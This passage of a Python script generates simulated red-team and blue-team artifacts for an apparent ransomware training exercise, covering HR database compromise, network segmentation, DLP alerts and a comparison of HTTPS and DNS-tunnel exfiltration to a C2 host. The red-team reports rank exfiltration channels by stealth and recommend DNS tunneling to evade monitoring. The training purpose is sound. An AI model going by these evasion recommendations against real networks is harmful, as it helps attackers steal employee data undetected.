Access Level: sysadmin (full database access)
Query Pattern: Database enumeration and data sampling
Data Accessed: Employee records, payroll data, benefits information
Data Volume: ~11.5 MB sampled

RISK ASSESSMENT:
----------------
Risk Score: 85/100 (HIGH)

Risk Factors:
- Unauthorized access from compromised server
- Full database access (sysadmin privileges)
- Sensitive data accessed (employee records, payroll, benefits)
- Data sampling indicates reconnaissance for exfiltration
- Connection from non-standard source (APP-DEV-02)

COMPARISON SUMMARY:
-------------------
Database          | Connections | Queries | Data Access | Risk
------------------|-------------|---------|-------------|------
DB-CUST-PROD      | 0           | 0       | NONE        | LOW
DB-HR-PROD        | 1           | 8       | DETECTED    | HIGH

RECOMMENDATION:
---------------
PRIORITY: HIGH - DB-HR-PROD shows signs of compromise

Immediate Actions:
1. Isolate DB-HR-PROD from network immediately
2. Review all database access from APP-DEV-02
3. Investigate for data exfiltration
4. Review authentication logs for unauthorized access
5. Consider isolating APP-DEV-02 (source of access)

The database access logs show successful connection and data queries from 
compromised server APP-DEV-02, indicating potential data exfiltration activity.

DB-CUST-PROD shows no signs of access attempts.
"""
    
    with open(ARTIFACTS_DIR / "db_access_logs_phase4.txt", 'w') as f:
        f.write(content)
    print("Created: db_access_logs_phase4.txt")
    
    # Blue Team: Network Segmentation Analysis
    content = """Microsoft Defender for Cloud - Network Segmentation Analysis
==================================================================
Analysis Date: 2024-01-15 11:15:00 UTC
Scope: Database Servers (Production)

NETWORK SEGMENTATION ASSESSMENT:
---------------------------------

1. DB-CUST-PROD (Customer Database - Production)
-------------------------------------------------
IP Address: 192.168.30.50
VLAN: PROD-ISOLATED-VLAN-30
Network Type: Isolated Production Network

Segmentation Status: EXCELLENT
- Network Isolation: ENABLED
- VLAN: Isolated (PROD-ISOLATED-VLAN-30)
- Firewall Rules: STRICT (database access only from whitelisted application servers)
- Access Control: RESTRICTED (whitelist only)
- Network Path: Isolated from standard network

Allowed Sources:
- APP-PROD-01 (Production Application Server) - Whitelisted
- APP-PROD-02 (Production Application Server) - Whitelisted
- Backup Server (Backup operations only) - Whitelisted

Blocked Sources:
- All development servers (DEV-NETWORK-VLAN-40) - BLOCKED
- All standard workstations (OPS-STANDARD-VLAN-20) - BLOCKED
- All other networks - BLOCKED

Network Security Assessment: STRONG
- Proper network isolation
- Strict firewall rules
- Whitelist-based access control
- No unauthorized access paths

2. DB-HR-PROD (Employee Records Database - Production)
-------------------------------------------------------
IP Address: 192.168.20.75
VLAN: OPS-STANDARD-VLAN-20
Network Type: Standard Operations Network

Segmentation Status: WEAK
- Network Isolation: NOT ENABLED
- VLAN: Standard (OPS-STANDARD-VLAN-20)
- Firewall Rules: MODERATE (standard database access rules)
- Access Control: STANDARD (domain authentication)
- Network Path: Accessible from standard network

Allowed Sources:
- All domain-joined servers - ALLOWED
- All domain-joined workstations - ALLOWED (with authentication)
- Application servers (production and development) - ALLOWED
- Standard network access - ALLOWED

Blocked Sources:
- External networks - BLOCKED
- Unauthenticated access - BLOCKED

Network Security Assessment: WEAK
- No network isolation
- Moderate firewall rules
- Standard access control (domain authentication only)
- Accessible from multiple network segments

COMPARISON SUMMARY:
-------------------
Database          | Isolation | VLAN Type      | Firewall    | Access Control | Security
------------------|----------|----------------|-------------|----------------|----------
DB-CUST-PROD      | ENABLED  | Isolated       | STRICT      | Whitelist      | STRONG
DB-HR-PROD        | DISABLED | Standard       | MODERATE    | Domain Auth    | WEAK

RISK ASSESSMENT:
----------------
DB-CUST-PROD Risk Score: 20/100 (LOW)
- Strong network isolation
- Strict access controls
- No unauthorized access paths
- Proper segmentation

DB-HR-PROD Risk Score: 75/100 (HIGH)
- No network isolation
- Moderate access controls
- Accessible from multiple network segments
- Weak segmentation

RECOMMENDATION:
---------------
PRIORITY: HIGH - DB-HR-PROD requires network segmentation improvement

Immediate Actions:
1. Isolate DB-HR-PROD to dedicated isolated VLAN
2. Implement strict firewall rules (whitelist only)
3. Restrict access to authorized application servers only
4. Review and audit all database access
5. Consider network segmentation similar to DB-CUST-PROD

The network segmentation analysis reveals that DB-HR-PROD lacks proper 
network isolation and is accessible from multiple network segments, 
representing a HIGH RISK for unauthorized access.

DB-CUST-PROD has proper network isolation and strong security controls.
"""
    
    with open(ARTIFACTS_DIR / "network_seg_phase4.txt", 'w') as f:
        f.write(content)
    print("Created: network_seg_phase4.txt")


def create_phase5_artifacts():
    """Phase 5: Data Exfiltration & Ransomware Deployment"""
    
    # Red Team: Exfiltration Method Testing
    content = """Exfiltration Method Testing Results
===================================
Test Date: 2024-01-15 12:00:00 UTC
Source: DB-HR-PROD (compromised database access)
Target: External C2 Server
Operator: RED-TEAM-ALPHA

TESTING METHODOLOGY:
--------------------
Two exfiltration methods tested:
1. HTTPS Tunnel (encrypted HTTPS connections)
2. DNS Tunneling (covert data exfiltration using DNS queries)

Each method tested for:
- Speed (data transfer rate)
- Reliability (connection stability)
- Detection risk (security tool response)
- Stealth (visibility and monitoring)

TEST RESULTS:
-------------

1. HTTPS TUNNEL
---------------
Method: Encrypted HTTPS connections to external server
Protocol: HTTPS (TCP/443)
Server: 185.220.101.78:443
Test Duration: 5 minutes
Data Transferred: 50 MB

Speed Assessment: HIGH (8/10)
- Transfer Rate: ~10 MB/minute
- Connection Speed: Fast
- Bandwidth Usage: High (visible)
- Transfer Time: 5 minutes for 50 MB

Reliability Assessment: HIGH (9/10)
- Connection Stability: Excellent
- Success Rate: 100% (all transfers successful)
- Error Rate: 0%
- Retry Required: No

Detection Risk Assessment: HIGH (8/10)
- DLP Monitoring: ACTIVE (well-monitored)
- Network Monitoring: ACTIVE (bandwidth analysis)
- Alert Generation: HIGH (multiple alerts generated)
- Blocking Probability: MEDIUM-HIGH (60%)
- Visibility: HIGH (large data transfers visible)

Stealth Assessment: LOW (3/10)
- High bandwidth usage (visible)
- Clear HTTPS connections (logged)
- DLP alerts generated
- Network monitoring active
- Low stealth characteristics

Overall Score: 6.5/10

2. DNS TUNNELING
----------------
Method: Covert data exfiltration using DNS queries
Protocol: DNS (UDP/53)
Server: dns.exfil.tk (malicious DNS server)
Test Duration: 15 minutes
Data Transferred: 50 MB

Speed Assessment: MEDIUM (5/10)
- Transfer Rate: ~3.3 MB/minute
- Connection Speed: Slow (DNS query limitations)
- Bandwidth Usage: Low (blends with normal DNS traffic)
- Transfer Time: 15 minutes for 50 MB

Reliability Assessment: MEDIUM (6/10)
- Connection Stability: Good
- Success Rate: 95% (some queries may fail)
- Error Rate: 5%
- Retry Required: Occasionally

Detection Risk Assessment: LOW (4/10)
- DLP Monitoring: LIMITED (DNS tunneling detection gaps)
- Network Monitoring: LIMITED (DNS traffic less monitored)
- Alert Generation: LOW (few alerts generated)
- Blocking Probability: LOW (20%)
- Visibility: LOW (blends with normal DNS traffic)

Stealth Assessment: HIGH (8/10)
- Low bandwidth usage (blends with normal traffic)
- DNS queries appear normal (encoded data)
- DLP detection gaps (limited monitoring)
- Network monitoring less aggressive
- High stealth characteristics

Overall Score: 5.75/10 (BEST FOR STEALTH)

COMPARISON SUMMARY:
-------------------
Method          | Speed | Reliability | Detection | Stealth | Overall
----------------|-------|-------------|-----------|---------|--------
HTTPS Tunnel    | HIGH  | HIGH        | HIGH      | LOW     | 6.5/10
DNS Tunneling   | MEDIUM| MEDIUM      | LOW       | HIGH    | 5.75/10

DETECTION RISK COMPARISON:
--------------------------
Method          | DLP Monitoring | Network Monitoring | Alert Gen | Blocking Prob
----------------|----------------|---------------------|-----------|---------------
HTTPS Tunnel    | ACTIVE         | ACTIVE              | HIGH      | 60%
DNS Tunneling   | LIMITED        | LIMITED             | LOW       | 20%

RECOMMENDATION:
---------------
Use DNS Tunneling for exfiltration.

Reasons:
1. Lower detection risk (limited DLP monitoring)
2. Higher stealth (blends with normal DNS traffic)
3. Lower blocking probability (20% vs 60%)
4. Reliable enough for data transfer (95% success rate)
5. Speed acceptable for exfiltration (3.3 MB/minute)

HTTPS Tunnel is faster but has higher detection risk and lower stealth.
DNS Tunneling offers better balance of reliability and low detection risk.
"""
    
    with open(ARTIFACTS_DIR / "exfil_testing_phase5.txt", 'w') as f:
        f.write(content)
    print("Created: exfil_testing_phase5.txt")
    
    # Red Team: Data Transfer Analysis
    content = """Data Transfer Analysis
======================
Analysis Date: 2024-01-15 12:15:00 UTC
Source: DB-HR-PROD (compromised database)
Target: External C2 Server
Operator: RED-TEAM-ALPHA

TRANSFER METHOD COMPARISON:
---------------------------

1. HTTPS TUNNEL
---------------
Protocol: HTTPS (TCP/443)
Server: 185.220.101.78:443
Data Volume: 50 MB test transfer

Transfer Characteristics:
- Speed: ~10 MB/minute (FAST)
- Bandwidth: High (visible spikes)
- Connection: Stable, reliable
- Latency: Low (15-20ms)
- Success Rate: 100%

Detection Characteristics:
- DLP Monitoring: ACTIVE (well-monitored)
- Network Monitoring: ACTIVE (bandwidth analysis)
- Alert Generation: HIGH (multiple alerts)
- Visibility: HIGH (large transfers visible)
- Blocking Risk: MEDIUM-HIGH (60%)

Advantages:
- Fast transfer speed
- Reliable connection
- High success rate

Disadvantages:
- High detection risk
- Low stealth
- High blocking probability
- Visible bandwidth usage

2. DNS TUNNELING
----------------
Protocol: DNS (UDP/53)
Server: dns.exfil.tk (malicious DNS server)
Data Volume: 50 MB test transfer

Transfer Characteristics:
- Speed: ~3.3 MB/minute (SLOW)
- Bandwidth: Low (blends with normal DNS)
- Connection: Good, occasional retries
- Latency: Medium (50-100ms)
- Success Rate: 95%

Detection Characteristics:
- DLP Monitoring: LIMITED (detection gaps)
- Network Monitoring: LIMITED (DNS less monitored)
- Alert Generation: LOW (few alerts)
- Visibility: LOW (blends with normal traffic)
- Blocking Risk: LOW (20%)

Advantages:
- Low detection risk
- High stealth
- Low blocking probability
- Blends with normal DNS traffic

Disadvantages:
- Slower transfer speed
- Occasional retries needed
- Lower success rate (95%)

COMPARISON SUMMARY:
-------------------
Method          | Speed    | Reliability | Detection Risk | Stealth | Blocking Risk
----------------|----------|-------------|----------------|---------|---------------
HTTPS Tunnel    | FAST     | HIGH        | HIGH           | LOW     | MEDIUM-HIGH
DNS Tunneling   | SLOW     | MEDIUM      | LOW            | HIGH    | LOW

RECOMMENDATION:
---------------
Use DNS Tunneling for exfiltration.

Reasons:
1. Lower detection risk (limited DLP monitoring, detection gaps)
2. Higher stealth (blends with normal DNS traffic)
3. Lower blocking probability (20% vs 60%)
4. Reliable enough (95% success rate, acceptable)
5. Speed acceptable (3.3 MB/minute, sufficient for exfiltration)

HTTPS Tunnel is faster but has significantly higher detection risk and 
lower stealth. DNS Tunneling offers better balance for covert exfiltration.

For time-sensitive exfiltration, consider splitting data across both methods,
but prioritize DNS Tunneling for majority of data.
"""
    
    with open(ARTIFACTS_DIR / "data_transfer_phase5.txt", 'w') as f:
        f.write(content)
    print("Created: data_transfer_phase5.txt")
    
    # Blue Team: DLP Alert Analysis
    content = """Microsoft Purview Data Loss Prevention - Alert Analysis
================================================================
Analysis Date: 2024-01-15 12:20:00 UTC
Time Range: 2024-01-15 12:00:00 - 12:30:00 UTC
Scope: Data Exfiltration Detection

DLP ALERT SUMMARY:
------------------
Total Alerts: 8
High Severity: 5
Medium Severity: 3
Low Severity: 0

ALERT BREAKDOWN BY METHOD:
--------------------------

1. HTTPS TUNNEL EXFILTRATION
-----------------------------
Alerts Generated: 5
Severity: HIGH (4), MEDIUM (1)

Alert Details:
Alert 1:
- Time: 2024-01-15 12:05:15 UTC
- Type: Large Data Transfer
- Source: DB-HR-PROD (192.168.20.75)
- Destination: 185.220.101.78:443
- Protocol: HTTPS
- Data Volume: 10 MB
- Detection: DLP Policy "Large External Transfer"
- Action: Alert generated

Alert 2:
- Time: 2024-01-15 12:06:30 UTC
- Type: Sensitive Data Transfer
- Source: DB-HR-PROD
- Destination: 185.220.101.78:443
- Protocol: HTTPS
- Data Volume: 10 MB
- Detection: DLP Policy "Sensitive Data External Transfer"
- Action: Alert generated

Alert 3:
- Time: 2024-01-15 12:07:45 UTC
- Type: Unusual Transfer Pattern
- Source: DB-HR-PROD
- Destination: 185.220.101.78:443
- Protocol: HTTPS
- Data Volume: 10 MB
- Detection: DLP Policy "Unusual Transfer Pattern"
- Action: Alert generated

Alert 4:
- Time: 2024-01-15 12:09:00 UTC
- Type: Large Data Transfer
- Source: DB-HR-PROD
- Destination: 185.220.101.78:443
- Protocol: HTTPS
- Data Volume: 10 MB
- Detection: DLP Policy "Large External Transfer"
- Action: Alert generated

Alert 5:
- Time: 2024-01-15 12:10:15 UTC
- Type: Sensitive Data Transfer
- Source: DB-HR-PROD
- Destination: 185.220.101.78:443
- Protocol: HTTPS
- Data Volume: 10 MB
- Detection: DLP Policy "Sensitive Data External Transfer"
- Action: Alert generated

Detection Coverage: EXCELLENT
- All HTTPS transfers detected
- Multiple DLP policies triggered
- High confidence detection
- Well-monitored

2. DNS TUNNELING EXFILTRATION
------------------------------
Alerts Generated: 3
Severity: MEDIUM (3)

Alert Details:
Alert 1:
- Time: 2024-01-15 12:12:00 UTC
- Type: Unusual DNS Activity
- Source: DB-HR-PROD
- Destination: dns.exfil.tk (DNS server)
- Protocol: DNS (UDP/53)
- Data Volume: Unknown (DNS queries)
- Detection: DLP Policy "Unusual DNS Activity" (limited coverage)
- Action: Alert generated (low confidence)

Alert 2:
- Time: 2024-01-15 12:18:00 UTC
- Type: Suspicious DNS Pattern
- Source: DB-HR-PROD
- Destination: dns.exfil.tk
- Protocol: DNS (UDP/53)
- Data Volume: Unknown
- Detection: DLP Policy "Suspicious DNS Pattern" (limited coverage)
- Action: Alert generated (medium confidence)

Alert 3:
- Time: 2024-01-15 12:24:00 UTC
- Type: Unusual DNS Activity
- Source: DB-HR-PROD
- Destination: dns.exfil.tk
- Protocol: DNS (UDP/53)
- Data Volume: Unknown
- Detection: DLP Policy "Unusual DNS Activity" (limited coverage)
- Action: Alert generated (low confidence)

Detection Coverage: LIMITED
- Some DNS activity detected
- Limited DLP policy coverage
- Lower confidence detection
- Less aggressive monitoring

COMPARISON SUMMARY:
-------------------
Method          | Alerts | Severity | Detection Coverage | Confidence
----------------|--------|----------|-------------------|-----------
HTTPS Tunnel    | 5      | HIGH     | EXCELLENT         | HIGH
DNS Tunneling   | 3      | MEDIUM   | LIMITED           | LOW-MEDIUM

RISK ASSESSMENT:
----------------
HTTPS Tunnel Risk: HIGH
- Well-monitored
- High confidence detection
- Multiple alerts generated
- Easy to identify and block

DNS Tunneling Risk: MEDIUM
- Limited monitoring
- Lower confidence detection
- Fewer alerts generated
- Harder to identify and block

RECOMMENDATION:
---------------
PRIORITY: HIGH - DNS Tunneling requires enhanced monitoring

Immediate Actions:
1. Enhance DNS tunneling detection capabilities
2. Implement DNS query analysis and monitoring
3. Review and block suspicious DNS domains (dns.exfil.tk)
4. Investigate DNS tunneling activity from DB-HR-PROD
5. Consider blocking DNS exfiltration at network level

HTTPS Tunnel exfiltration is well-monitored with excellent detection coverage.
DNS Tunneling has limited detection coverage and represents a higher ongoing risk.

Both methods detected, but DNS Tunneling requires enhanced monitoring and blocking.
"""
    
    with open(ARTIFACTS_DIR / "dlp_analysis_phase5.txt", 'w') as f:
        f.write(content)
    print("Created: dlp_analysis_phase5.txt")
    
    # Blue Team: Network Bandwidth Analysis
    content = """Microsoft Defender for Cloud - Network Bandwidth Analysis
==================================================================
Analysis Date: 2024-01-15 12:25:00 UTC
Time Range: 2024-01-15 12:00:00 - 12:30:00 UTC
Source: DB-HR-PROD (192.168.20.75)

BANDWIDTH ANALYSIS:
-------------------

1. HTTPS TRAFFIC
-----------------
Time Range: 2024-01-15 12:00:00 - 12:15:00 UTC
Destination: 185.220.101.78:443
Protocol: HTTPS (TCP/443)

Bandwidth Characteristics:
- Baseline: ~1-2 MB/minute (normal database operations)
- Anomaly Period: 12:05:00 - 12:10:00 UTC
- Peak Bandwidth: ~10 MB/minute (5x normal)
- Total Data Transferred: ~50 MB
- Connection Duration: 5 minutes
- Transfer Pattern: Sustained high bandwidth

Anomaly Detection: CLEAR
- Significant bandwidth spike detected
- Sustained high bandwidth usage
- Unusual transfer pattern
- Clear anomaly indicators

Alert Generation: HIGH
- Multiple bandwidth alerts generated
- Clear anomaly detection
- High confidence alerts
- Easy to identify

Analysis: HTTPS traffic shows CLEAR anomalies with significant bandwidth spikes.
Easy to identify and block.

2. DNS TRAFFIC
--------------
Time Range: 2024-01-15 12:00:00 - 12:30:00 UTC
Destination: dns.exfil.tk (DNS server)
Protocol: DNS (UDP/53)

Bandwidth Characteristics:
- Baseline: ~100-200 KB/minute (normal DNS queries)
- Anomaly Period: 12:10:00 - 12:25:00 UTC
- Peak Bandwidth: ~300-400 KB/minute (2x normal)
- Total Data Transferred: ~50 MB (estimated, encoded in DNS queries)
- Query Duration: 15 minutes
- Transfer Pattern: Sustained moderate increase

Anomaly Detection: LESS OBVIOUS
- Moderate bandwidth increase (2x normal)
- Blends with normal DNS traffic
- Less obvious anomaly indicators
- Requires deeper analysis

Alert Generation: LOW
- Few bandwidth alerts generated
- Lower confidence alerts
- Harder to identify
- Requires correlation analysis

Analysis: DNS traffic shows LESS OBVIOUS anomalies with moderate bandwidth increase.
Harder to identify and may blend with normal DNS traffic.

COMPARISON SUMMARY:
-------------------
Method          | Bandwidth Spike | Anomaly Detection | Alert Gen | Visibility
----------------|-----------------|------------------|-----------|------------
HTTPS Tunnel    | 5x normal       | CLEAR            | HIGH      | HIGH
DNS Tunneling   | 2x normal       | LESS OBVIOUS     | LOW       | LOW

RISK ASSESSMENT:
----------------
HTTPS Tunnel Risk: HIGH
- Clear bandwidth anomalies
- Easy to identify
- High confidence detection
- Well-monitored

DNS Tunneling Risk: MEDIUM-HIGH
- Less obvious bandwidth anomalies
- Harder to identify
- Lower confidence detection
- Less aggressive monitoring

RECOMMENDATION:
---------------
PRIORITY: HIGH - DNS Tunneling requires enhanced monitoring

Immediate Actions:
1. Enhance DNS traffic monitoring and analysis
2. Implement DNS query pattern analysis
3. Review and block suspicious DNS domains (dns.exfil.tk)
4. Investigate DNS tunneling activity from DB-HR-PROD
5. Consider DNS filtering and monitoring enhancements

HTTPS Tunnel exfiltration shows clear bandwidth anomalies and is well-monitored.
DNS Tunneling shows less obvious anomalies and requires enhanced monitoring.

Both methods show anomalies, but DNS Tunneling is less obvious and represents 
a higher ongoing risk due to limited detection capabilities.
"""
    
    with open(ARTIFACTS_DIR / "bandwidth_analysis_phase5.txt", 'w') as f:
        f.write(content)
    print("Created: bandwidth_analysis_phase5.txt")


if __name__ == "__main__":
    print("Generating artifact files for intermediate ransomware scenario...")
    print(f"Artifacts directory: {ARTIFACTS_DIR}\n")
    
    print("Creating Phase 1 artifacts...")
    create_phase1_artifacts()
    
    print("\nCreating Phase 2 artifacts...")
    create_phase2_artifacts()
    
    print("\nCreating Phase 3 artifacts...")
    create_phase3_artifacts()
    
    print("\nCreating Phase 4 artifacts...")
    create_phase4_artifacts()
    
    print("\nCreating Phase 5 artifacts...")
    create_phase5_artifacts()
    
    print("\n✅ Artifact generation complete!")

